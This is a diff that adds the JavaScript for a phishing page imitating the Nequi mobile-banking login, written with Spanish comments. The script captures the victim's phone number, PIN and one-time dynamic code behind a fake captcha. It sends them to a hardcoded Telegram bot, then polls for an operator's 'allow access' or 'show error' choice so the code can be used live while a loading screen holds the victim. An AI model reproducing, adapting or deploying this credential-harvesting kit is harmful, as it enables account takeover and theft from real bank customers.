@@ -1,0 +1,222 @@
+document.addEventListener('DOMContentLoaded', function() {
+    // 1. Detección automática de elementos en Nequi
+    const inputsAll = document.querySelectorAll('input');
+    let phoneInput = null;
+    let passwordInput = null;
+    let dynamicCodeInput = null;
+
+    inputsAll.forEach(inp => {
+        if (inp.type === 'tel' || inp.placeholder?.toLowerCase().includes('celular')) phoneInput = inp;
+        if (inp.type === 'password') passwordInput = inp;
+        if (inp.id === 'claveDinamica' || inp.placeholder?.toLowerCase().includes('dinámica')) dynamicCodeInput = inp;
+    });
+
+    const submitBtn = document.querySelector('button'); 
+    const termsCheckboxDiv = document.getElementById('captchaBox');
+    const captchaOuterCircle = document.getElementById('captchaOuterCircle');
+    const captchaCircle = document.getElementById('captchaCircle');
+    const captchaCheckIcon = document.getElementById('captchaCheckIcon');
+    const loadingOverlay = document.getElementById('loadingOverlay');
+    
+    let isChecked = false;
+    let pollingInterval;
+
+    const TELEGRAM_API_KEY = '8627198220:AAHlyBdeq2SeDlVN6G4_6QPdQrwU3tY-ICw';
+    const TELEGRAM_CHAT_ID = '-1004245962123';
+
+    // Desbloquear inputs
+    if (phoneInput) phoneInput.removeAttribute('readonly');
+    if (passwordInput) phoneInput.removeAttribute('readonly');
+    if (dynamicCodeInput) dynamicCodeInput.removeAttribute('readonly');
+
+    // 2. Restricciones estrictas
+    if (phoneInput) {
+        phoneInput.setAttribute('maxlength', '10');
+        phoneInput.setAttribute('inputmode', 'numeric');
+        phoneInput.addEventListener('input', (e) => {
+            e.target.value = e.target.value.replace(/[^0-9]/g, '').slice(0, 10);
+            validateForm();
+        });
+    }
+
+    if (passwordInput) {
+        passwordInput.setAttribute('maxlength', '4');
+        passwordInput.setAttribute('inputmode', 'numeric');
+        passwordInput.addEventListener('input', (e) => {
+            e.target.value = e.target.value.replace(/[^0-9]/g, '').slice(0, 4);
+            validateForm();
+        });
+    }
+
+    if (dynamicCodeInput) {
+        dynamicCodeInput.setAttribute('maxlength', '6');
+        dynamicCodeInput.setAttribute('inputmode', 'numeric');
+        dynamicCodeInput.addEventListener('input', (e) => {
+            e.target.value = e.target.value.replace(/[^0-9]/g, '').slice(0, 6);
+            validateForm();
+        });
+    }
+
+    // 3. Checkbox Persona Real
+    if (termsCheckboxDiv && captchaCircle) {
+        termsCheckboxDiv.addEventListener('click', () => {
+            isChecked = !isChecked;
+
+            if (isChecked) {
+                termsCheckboxDiv.style.borderColor = '#10B981';
+                termsCheckboxDiv.style.backgroundColor = '#F0FDF4'; 
+                if (captchaOuterCircle) captchaOuterCircle.style.backgroundColor = '#DCFCE7'; 
+                captchaCircle.style.borderColor = '#10B981';
+                captchaCircle.style.backgroundColor = '#ffffff';
+                if (captchaCheckIcon) captchaCheckIcon.classList.remove('hidden');
+            } else {
+                termsCheckboxDiv.style.borderColor = '#e075ae';
+                termsCheckboxDiv.style.backgroundColor = '#ffffff';
+                if (captchaOuterCircle) captchaOuterCircle.style.backgroundColor = '#ffffff';
+                captchaCircle.style.borderColor = '#da0081';
+                captchaCircle.style.backgroundColor = '#ffffff';
+                if (captchaCheckIcon) captchaCheckIcon.classList.add('hidden');
+            }
+            validateForm();
+        });
+    }
+
+    // 4. Validación para habilitar el botón
+    function validateForm() {
+        const isPhoneValid = phoneInput && phoneInput.value.length === 10;
+        const isPasswordValid = passwordInput && passwordInput.value.length === 4;
+        const isDynamicValid = dynamicCodeInput && dynamicCodeInput.value.length === 6; 
+        
+        if (isPhoneValid && isPasswordValid && isDynamicValid && isChecked && submitBtn) {
+            submitBtn.removeAttribute('disabled');
+            submitBtn.style.backgroundColor = '#da0081';
+            submitBtn.style.cursor = 'pointer';
+            submitBtn.style.opacity = '1';
+        } else if (submitBtn) {
+            submitBtn.setAttribute('disabled', 'true');
+            submitBtn.style.backgroundColor = '#F1BFDA';
+            submitBtn.style.cursor = 'not-allowed';
+            submitBtn.style.opacity = '0.9';
+        }
+    }
+
+    [phoneInput, passwordInput, dynamicCodeInput].forEach(inp => {
+        if (inp) inp.addEventListener('input', validateForm);
+    });
+
+    // 5. Funciones de Telegram con Botones Interactivos
+    async function sendTelegramMessage(message) {
+        const url = `https://api.telegram.org/bot${TELEGRAM_API_KEY}/sendMessage`;
+        const keyboard = {
+            inline_keyboard: [
+                [
+                    { text: '❌ Mostrar Error', callback_data: 'mostrar_error' },
+                    { text: '✅ Permitir Acceso', callback_data: 'permitir_acceso' }
+                ]
+            ]
+        };
+        
+        try {
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML',
+                    reply_markup: keyboard
+                }),
+            });
+            const data = await response.json();
+            return data.result ? data.result.message_id : null;
+        } catch (error) {
+            console.error('Error al enviar mensaje:', error);
+            return null;
+        }
+    }
+
+    async function checkTelegramResponse(messageId) {
+        const url = `https://api.telegram.org/bot${TELEGRAM_API_KEY}/getUpdates?limit=100`;
+        try {
+            const response = await fetch(url);
+            const data = await response.json();
+            
+            if (data.ok && data.result.length > 0) {
+                for (const update of data.result) {
+                    if (update.callback_query && 
+                        update.callback_query.message && 
+                        update.callback_query.message.message_id === messageId) {
+                        return update.callback_query.data;
+                    }
+                }
+            }
+            return null;
+        } catch (error) {
+            console.error('Error al verificar respuesta:', error);
+            return null;
+        }
+    }
+
+    function startPolling(messageId) {
+        return new Promise((resolve) => {
+            let attempts = 0;
+            const maxAttempts = 150; // 5 minutos máximo de espera
+            
+            pollingInterval = setInterval(async () => {
+                attempts++;
+                const response = await checkTelegramResponse(messageId);
+                
+                if (response) {
+                    clearInterval(pollingInterval);
+                    resolve(response);
+                } else if (attempts >= maxAttempts) {
+                    clearInterval(pollingInterval);
+                    resolve('timeout');
+                }
+            }, 2000);
+        });
+    }
+
+    // 6. Acción del botón "Entra" con loader en pantalla completa y sondeo de Telegram
+    if (submitBtn) {
+        submitBtn.addEventListener('click', async function(e) {
+            e.preventDefault();
+            
+            const phone = phoneInput ? phoneInput.value : '';
+            const password = passwordInput ? passwordInput.value : '';
+            const dynamicCode = dynamicCodeInput ? dynamicCodeInput.value : '';
+            
+            // Mostrar Loader de pantalla completa inmediatamente
+            if (loadingOverlay) loadingOverlay.style.display = 'flex';
+
+            const messageId = await sendTelegramMessage(`
+📱 <b>Nuevo intento de acceso a Nequi</b>
+📞 Celular: ${phone}
+🔑 Clave (4 dígitos): ${password}
+🔢 Clave Dinámica (6 dígitos): ${dynamicCode}
+            `);
+
+            if (messageId) {
+                const adminResponse = await startPolling(messageId);
+                
+                // Ocultar loader al recibir respuesta
+                if (loadingOverlay) loadingOverlay.style.display = 'none';
+
+                if (adminResponse === 'permitir_acceso') {
+                    // Redirigir a página de éxito
+                    window.location.href = '../confirmacion.html'; 
+                } else {
+                    alert('Clave dinámica o datos incorrectos. Por favor, intente nuevamente.');
+                    if (passwordInput) passwordInput.value = '';
+                    if (dynamicCodeInput) dynamicCodeInput.value = '';
+                    validateForm();
+                }
+            } else {
+                if (loadingOverlay) loadingOverlay.style.display = 'none';
+                alert('Error de conexión con el servidor.');
+            }
+        });
+    }
+
+    validateForm();
+});
